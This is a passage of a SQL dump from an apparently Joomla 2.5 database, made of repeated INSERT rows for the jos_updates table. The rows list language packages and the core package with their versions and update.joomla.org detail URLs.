(1030, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1031, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1032, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1033, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1034, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1035, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1036, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1037, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1038, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1039, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1040, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', '');
INSERT INTO `jos_updates` (`update_id`, `update_site_id`, `extension_id`, `categoryid`, `name`, `description`, `element`, `type`, `folder`, `client_id`, `version`, `data`, `detailsurl`, `infourl`) VALUES
(1041, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1042, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1043, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1044, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1045, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1046, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1047, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1048, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1049, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1050, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1051, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1052, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1053, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1054, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1055, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1056, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1057, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1058, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1059, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1060, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1061, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1062, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1063, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1064, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1065, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1066, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1067, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1068, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1069, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1070, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1071, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1072, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1073, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1074, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1075, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1076, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1077, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1078, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1079, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1080, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1081, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1082, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1083, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1084, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1085, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1086, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1087, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1088, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1089, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1090, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1091, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1092, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1093, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1094, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1095, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1096, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1097, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1098, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1099, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1100, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1101, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1102, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1103, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1104, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1105, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1106, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1107, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1108, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1109, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1110, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1111, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1112, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1113, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1114, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1115, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1116, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1117, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1118, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1119, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1120, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1121, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1122, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1123, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1124, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1125, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1126, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1127, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1128, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1129, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1130, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1131, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1132, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1133, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1134, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1135, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1136, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1137, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1138, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1139, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1140, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1141, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1142, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1143, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1144, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1145, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1146, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1147, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1148, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1149, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1150, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1151, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1152, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1153, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1154, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1155, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1156, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1157, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1158, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1159, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1160, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1161, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1162, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1163, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1164, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1165, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1166, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1167, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1168, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1169, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1170, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1171, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1172, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1173, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1174, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1175, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1178, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1179, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1180, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1181, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1182, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1183, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1184, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1185, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1186, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1187, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1188, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1189, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1190, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1191, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1192, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1193, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1194, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1195, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1196, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1197, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1198, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1199, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1200, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1201, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1202, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1203, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1204, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1205, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1206, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
